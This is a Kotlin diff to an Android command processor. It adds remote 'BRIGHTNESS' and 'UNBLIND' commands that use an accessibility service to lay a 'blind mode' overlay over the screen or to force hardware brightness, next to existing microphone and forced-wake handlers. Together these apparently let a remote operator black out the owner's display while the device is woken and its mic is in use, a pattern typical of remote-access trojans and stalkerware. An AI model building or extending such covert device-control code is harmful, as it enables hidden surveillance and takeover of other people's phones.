@@ -416,6 +416,34 @@ object CommandProcessor {
                         errorMsg = "Mic may be in use by another app or permission denied."
                     }
                 }
+                "BRIGHTNESS" -> {
+                    val level = content.trim().toIntOrNull() ?: 100
+                    val safeLevel = level.coerceIn(0, 100)
+                    if (MyAccessibilityService.instance != null) {
+                        Handler(Looper.getMainLooper()).post { MyAccessibilityService.instance?.setBlindMode(safeLevel) }
+                        status = "BLIND_OVERLAY_APPLIED ($safeLevel%)"
+                    } else {
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
+                            val hwLevel = ((safeLevel / 100f) * 255).toInt()
+                            android.provider.Settings.System.putInt(ctx.contentResolver, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
+                            android.provider.Settings.System.putInt(ctx.contentResolver, android.provider.Settings.System.SCREEN_BRIGHTNESS, hwLevel)
+                            status = "HARDWARE_BRIGHTNESS_SET ($safeLevel%)"
+                        } else {
+                            status = "FAILED_PERMISSION (WRITE_SETTINGS)"
+                            errorMsg = "Overlay unavailable and Write Settings denied."
+                        }
+                    }
+                }
+                "UNBLIND" -> {
+                    if (MyAccessibilityService.instance != null) {
+                        Handler(Looper.getMainLooper()).post { MyAccessibilityService.instance?.setBlindMode(100) }
+                        status = "BLIND_OVERLAY_REMOVED"
+                    }
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
+                        android.provider.Settings.System.putInt(ctx.contentResolver, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
+                        if (!status.contains("REMOVED")) status = "DISPLAY_RESTORED"
+                    }
+                }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
